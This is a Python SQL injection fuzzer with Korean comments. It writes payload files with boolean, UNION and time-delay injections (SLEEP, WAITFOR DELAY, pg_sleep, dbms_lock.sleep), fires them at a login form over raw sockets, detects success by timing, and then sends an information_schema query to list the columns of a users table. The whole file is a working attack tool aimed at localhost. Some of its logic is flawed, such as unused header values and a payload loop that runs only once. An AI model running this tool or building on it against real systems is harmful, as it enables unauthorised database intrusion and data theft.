import os
import socket
from datetime import datetime
import time
import re
from gevent.pool import Pool

# 필요한 디렉토리와 파일 생성 함수
def setup_required_files():
    headers_dir = "fuzz-data/headers"
    payloads_dir = "fuzz-data/payloads"

    os.makedirs(headers_dir, exist_ok=True)
    os.makedirs(payloads_dir, exist_ok=True)

    with open(os.path.join(headers_dir, "default_headers.txt"), "w") as f:
        f.write("User-Agent\nReferer\nX-Forwarded-For\n")

    with open(os.path.join(payloads_dir, "oracle_time.txt"), "w") as f:
        f.write("' OR 1=1--\n' OR 'a'='a\n' UNION SELECT NULL, NULL--\n' OR SLEEP(5)--\n")
        f.write("' OR WAITFOR DELAY '0:0:5'--\n' OR pg_sleep(5); --\n' OR dbms_lock.sleep(5); --\n")

# 파일 설정 함수 호출
setup_required_files()

class SqlEngine:
    def __init__(self, target, target_param, sqli_template):
        self.server = target['server']
        self.port = target['port']
        self.vuln_header = target.get('vulnHeader', '')
        self.header_value = target.get('headerValue', '')
        self.sleep_time = target_param.get('sleepTime', 2)
        self.sql_injection_template = sqli_template
        self.verbose = target_param.get('verbosity', 'low').lower()
        self.connection = None  # 재사용할 소켓 연결

        sanitized_server = re.sub(r'[^A-Za-z0-9_.-]', '_', self.server)
        self.logfile = f"logs/{sanitized_server}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        self.result = False
        self.successful_payload = ""

    def log(self, message, func_name="알 수 없는 함수"):
        """오류 로그를 파일에 기록하고, 필요시 터미널에 출력"""
        if self.verbose == "high":
            print(f"[!] {func_name}에서 오류 발생: {message}")
        os.makedirs("logs", exist_ok=True)
        with open(self.logfile, 'a') as log:
            log.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')},{func_name},{message}\n")

    def open_connection(self):
        """서버와의 연결을 생성 또는 재사용"""
        if not self.connection:
            try:
                self.connection = socket.create_connection((self.server, self.port))
            except Exception as e:
                self.log(f"연결 실패: {e}", "open_connection")
                self.connection = None

    def send_payload(self, sql, method="POST", url_path="/login", retries=3):
        """SQL 인젝션 페이로드 전송 함수"""
        post_data = f"username={sql}&password=dummy_password"
        headers = (
            f"{method} {url_path} HTTP/1.1\r\n"
            f"Host: {self.server}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(post_data)}\r\n"
            f"Connection: keep-alive\r\n\r\n"
        )
        request = headers + post_data

        for attempt in range(retries):
            try:
                self.open_connection()
                if not self.connection:
                    continue
                start_time = time.time()
                self.connection.send(request.encode())
                response = self.connection.recv(4096).decode()
                end_time = time.time()

                self.log(f"응답: {response[:200]}", "send_payload")
                
                if (end_time - start_time) > self.sleep_time or "로그인 실패" not in response:
                    self.result = True
                    self.successful_payload = sql
                return end_time - start_time
            except Exception as e:
                self.log(f"전송 실패, 재시도: {e}", "send_payload")
                self.connection = None  # 재시도 전 연결 재설정
            time.sleep(0.5)  # 재시도 전 지연
        return None

    def is_injectable(self, sql):
        """SQL 인젝션 성공 여부를 확인하는 함수"""
        elapsed_time = self.send_payload(sql)
        if elapsed_time and elapsed_time > self.sleep_time:
            self.result = True
            return True
        return False

    def data_extraction(self):
        """성공한 페이로드로부터 데이터 추출"""
        if self.result and self.successful_payload:
            print("[*] 데이터 추출에 성공한 페이로드가 있습니다.")
            extraction_sql = "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--"
            elapsed_time = self.send_payload(extraction_sql)
            if elapsed_time:
                print("[*] 데이터가 성공적으로 추출되었습니다. 로그 파일을 확인하세요.")
                self.log(f"추출된 데이터 페이로드: {self.successful_payload}", "data_extraction")

class DBMSSQLInjectionOracle:
    def __init__(self, target, target_param, sqli_template):
        self.sql_engine = SqlEngine(target, target_param, sqli_template)

    def run(self, headers_file, injection_file):
        try:
            print("[*] Oracle SQL 인젝션을 시작합니다...")
            blind_seeker = BlindSeeker(self.sql_engine)
            blind_seeker.fuzz(headers_file, injection_file)
            if self.sql_engine.result:
                print("[*] SQL 인젝션 성공. 데이터 추출을 시작합니다...")
                self.sql_engine.data_extraction()
            else:
                print("[*] SQL 인젝션이 실패했습니다. 다른 페이로드를 시도하세요.")
        except Exception as e:
            print(f"[!] SQL 인젝션 중 오류 발생: {e}")

class BlindSeeker:
    def __init__(self, sql_engine, pool_size=10):
        self.sql_engine = sql_engine
        self.pool = Pool(pool_size)  # 동적 풀 크기 설정

    def fuzz(self, headers_file, injections_file):
        print(f"[*] {self.sql_engine.server}:{self.sql_engine.port}에서 퍼징을 시작합니다.")
        with open(headers_file) as headers, open(injections_file) as injections:
            for header in headers:
                header = header.strip()
                for injection in injections:
                    injection = injection.strip()
                    self.pool.spawn(self.sql_engine.is_injectable, injection)
                    self.sql_engine.vuln_header = header
                    self.sql_engine.header_value = injection
        self.pool.join()
        self.log_results()

    def log_results(self):
        if self.sql_engine.result:
            print("[*] SQL 인젝션 취약점이 발견되었습니다.")
        else:
            print("[*] 취약점이 발견되지 않았습니다. 페이로드를 조정하고 다시 시도하세요.")

# 대상 서버 설정
target = {
    'server': 'localhost',
    'port': 8080,
    'vulnHeader': 'X-Forwarded-For',
    'headerValue': 'fuzzer'
}

target_param = {
    'sleepTime': 5,
    'verbosity': 'high'
}

sqli_template = "' or if((*sql*),dbms_pipe.receive_message('a',*time*),0) and '1'='1"
header_file = "fuzz-data/headers/default_headers.txt"
injection_file = "fuzz-data/payloads/oracle_time.txt"

# DBMSSQLInjectionOracle 객체 생성 및 실행
dbms_injector = DBMSSQLInjectionOracle(target, target_param, sqli_template)
dbms_injector.run(header_file, injection_file)
